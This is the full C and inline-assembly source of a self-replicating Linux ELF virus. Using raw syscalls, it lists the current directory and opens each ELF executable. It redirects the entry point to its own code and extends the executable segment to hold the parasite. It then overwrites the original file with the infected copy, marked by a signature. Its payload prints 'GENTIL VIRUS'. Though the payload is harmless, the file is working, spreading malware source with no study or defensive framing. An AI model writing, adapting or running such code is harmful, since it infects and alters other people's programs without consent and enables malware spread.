#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <linux/fcntl.h>
#include <errno.h>
#include <elf.h>
#include <asm/unistd.h>
#include <asm/stat.h>
#include <sys/mman.h>
#include <sys/types.h>

#define PAGE_SIZE 4096
#define BUF_SIZE 1024
#define JMP_CODE_SIZE 5
#define SIGNATURE 0xDEADdeadDEADdead
#define SIGNATURE_SIZE 8

extern unsigned long myend;
extern unsigned long real_start;

void _start()
{
  __asm__ volatile(".globl real_start\n"
          "real_start:\n"
          "pushq %rax\n" // registers not preserved
          "pushq %rcx\n" // across function call
          "pushq %rdx\n"
          "pushq %rsi\n"
          "pushq %rdi\n"
          "pushq %r8\n"
          "pushq %r9\n"
          "pushq %r10\n"
          "pushq %r11\n"
          "call do_main\n"
          "popq %r11\n"
          "popq %r10\n"
          "popq %r9\n"
          "popq %r8\n"
          "popq %rdi\n"
          "popq %rsi\n"
          "popq %rdx\n"
          "popq %rcx\n"
          "popq %rax\n"
          "jmp myend\n");
}

int mystrncmp(const char *s1, const char *s2, size_t n)
{
  if (n == 0) return 0;
  do {
    if (*s1 != *s2++)
      return (*(unsigned char *)s1 - *(unsigned char *)--s2);
    if (*s1++ == 0)
      break;
  } while (--n != 0);
  return 0;
}

struct linux_dirent
  {
    long d_ino;
    off_t d_off;
    unsigned short d_reclen;
    char d_name[];
  };

void exit_syscall(int e)
{
  __asm__ volatile("syscall"
          :
          : "a"(60), "D"(e));
}

int open_syscall(const char * pathname, int flags, int mode)
{
  int res;
  __asm__ volatile("syscall"
          : "=a"(res)
          : "0"(2), "D"(pathname), "S"(flags), "d"(mode));
  return res;
}

int getdents_syscall(unsigned int fd, struct linux_dirent* dir, unsigned int count)
{
  int res;
  __asm__ volatile("syscall"
          : "=a"(res)
          : "0"(78), "D"(fd), "S"(dir), "d"(count));
  return res;
}

int stat_syscall(const char * pathname, struct stat* statbuf)
{
  int res;
  __asm__ volatile("syscall"
          : "=a"(res)
          : "0"(4), "D"(pathname), "S"(statbuf));
  return res;
}

int close_syscall(unsigned int fd)
{
  int res;
  __asm__ volatile("syscall"
          : "=a"(res)
          : "0"(3), "D"(fd));
  return res;
}

ssize_t read_syscall(unsigned int fd, void * buf, size_t count)
{
  ssize_t res;
  __asm__ volatile("syscall"
          : "=a"(res)
          : "0"(0), "D"(fd), "S"(buf), "d"(count));
  return res;
}

ssize_t write_syscall(unsigned int fd, void * buf, size_t count)
{
  ssize_t res;
  __asm__ volatile("syscall"
          : "=a"(res)
          : "0"(1), "D"(fd), "S"(buf), "d"(count));
  return res;
}

void * mmap_syscall(void * addr, size_t len,
                    unsigned long prot, unsigned long flags,
                    unsigned long fd, unsigned long off)
{
  unsigned long res;
  __asm__ volatile("movq %0, %%rdi\n"
                   "movq %1, %%rsi\n"
                   "movq %2, %%rdx\n"
                   "movq %3, %%r10\n"
                   "movq %4, %%r8\n"
                   "movq %5, %%r9\n"
                   "movq $9, %%rax\n"
                   "syscall\n"
                   :
                   : "g"(addr), "g"(len), "g"(prot),
                     "g"(flags), "g"(fd), "g"(off));
  __asm__ volatile ("mov %%rax, %0" : "=r"(res));
  return (void *)res;
}

int munmap_syscall(void * addr, size_t len)
{
  int res;
  __asm__ volatile("syscall"
          : "=a"(res)
          : "0"(11), "D"(addr), "S"(len));
  return res;
}

int rename_syscall(const char * oldname, const char * newname)
{
  int res;
  __asm__ volatile("syscall"
          : "=a"(res)
          : "0"(82), "D"(oldname), "S"(newname));
  return res;
}

void mirror_binary_with_parasite(unsigned char * mem,
                                 unsigned long end_of_text,
                                 unsigned long after_re, 
                                 long old_e_entry_relative,
                                 size_t parasite_size,
                                 size_t zeroes_size,
                                 struct stat st,
                                 const char * host)
{
  char jmp_code[JMP_CODE_SIZE];
  jmp_code[0] = '\xe9'; /* jump near relative */
  jmp_code[1] = '\x00';
  jmp_code[2] = '\x00';
  jmp_code[3] = '\x00';
  jmp_code[4] = '\x00';
  *(int *)&jmp_code[1] = old_e_entry_relative;
  char tmp[3];
  tmp[0] = '.';
  tmp[1] = 'v';
  tmp[2] = 0;
  int ofd = open_syscall(tmp, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode);
  write_syscall(ofd, mem, end_of_text);
  write_syscall(ofd, (char *)&real_start, parasite_size - JMP_CODE_SIZE);
  write_syscall(ofd, jmp_code, JMP_CODE_SIZE);
  long signature = SIGNATURE;
  write_syscall(ofd, &signature, SIGNATURE_SIZE);
  char * zero = mmap_syscall(0, zeroes_size, PROT_READ, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
  write_syscall(ofd, zero, zeroes_size);
  munmap_syscall(zero, zeroes_size);
  mem += after_re;
  size_t last_chunk = st.st_size - after_re;
  write_syscall(ofd, mem, last_chunk);
  close_syscall(ofd);
  rename_syscall(tmp, host);
}

void payload()
{
  char msg[] = {'\x1b', '[', '5', 'm',
                '\x1b', '[', '3', '1', 'm',
                '\x1b', '[', '1', 'm',
                'G', 'E', 'N', 'T', 'I', 'L', ' ', 'V', 'I', 'R', 'U', 'S', '\n',
                '\x1b', '[', '0', 'm'};
  write_syscall(STDOUT_FILENO, msg, sizeof msg);
}

void do_main()
{
  size_t parasite_size = (char *)&myend - (char *)&real_start;
  parasite_size += JMP_CODE_SIZE;
  Elf64_Shdr *s_hdr;
  Elf64_Ehdr *e_hdr;
  Elf64_Phdr *p_hdr;
  char buf[BUF_SIZE];
  char cwd[2];
  cwd[0] = '.';
  cwd[1] = 0;
  int dd = open_syscall(cwd, O_RDONLY | O_DIRECTORY, 0);
  int nread = getdents_syscall(dd, (struct linux_dirent *)buf, BUF_SIZE);
  for (int bpos = 0; bpos < nread;)
    {
      struct linux_dirent *d = (struct linux_dirent *)(buf + bpos);
      bpos += d->d_reclen;
      char* host = d->d_name;
      if (host[0] == '.') continue;
      if (host[0] == 'g') continue;
      int fd = open_syscall(d->d_name, O_RDONLY, 0);
      struct stat st;
      stat_syscall(host, &st);
      char mem[st.st_size];
      read_syscall(fd, mem, st.st_size);
      e_hdr = (Elf64_Ehdr *)mem;
      char elf[] = "ELF";
      if (e_hdr->e_ident[0] != 0x7f || mystrncmp(&e_hdr->e_ident[1], elf, 3))
        {
          close_syscall(fd);
          continue;
        }
      p_hdr = (Elf64_Phdr *)(mem + e_hdr->e_phoff);
      int text_found = 0;
      unsigned long parasite_addr, old_e_entry;
      unsigned long end_of_text;
      unsigned long after_re;
      size_t zeroes_size;
      for (int i = 0; i < e_hdr->e_phnum; i++, p_hdr++)
        {
          if (text_found) {
            after_re = p_hdr->p_offset;
            if (end_of_text + parasite_size + SIGNATURE_SIZE > after_re) goto not_enough_space;
            zeroes_size = after_re - end_of_text - parasite_size - SIGNATURE_SIZE;            
            break;
          }
          if (p_hdr->p_type == PT_LOAD && (p_hdr->p_flags & PF_X) && !text_found)
            {
              long signature = *((long*)&mem[p_hdr->p_offset + p_hdr->p_filesz - SIGNATURE_SIZE]);
              if (signature == SIGNATURE) goto signature_found;
              parasite_addr = p_hdr->p_vaddr + p_hdr->p_filesz;
              old_e_entry = e_hdr->e_entry;
              e_hdr->e_entry = parasite_addr;
              end_of_text = p_hdr->p_offset + p_hdr->p_filesz;
              p_hdr->p_filesz += parasite_size + SIGNATURE_SIZE;
              p_hdr->p_memsz += parasite_size + SIGNATURE_SIZE;
              text_found = 1;
            }
        }
      long old_e_entry_relative = old_e_entry - (parasite_addr + parasite_size);
      mirror_binary_with_parasite(mem,
                                  end_of_text,
                                  after_re,
                                  old_e_entry_relative,
                                  parasite_size,
                                  zeroes_size,
                                  st,
                                  host);
    signature_found:
    not_enough_space:
      close_syscall(fd);
    }
  close_syscall(dd);
  payload();
}

void end_code()
{
  __asm__ volatile (".globl myend\n"
          "myend:      \n"
          "movq $60, %rax\n"
          "movq  $0, %rdi\n"
          "syscall\n");
}
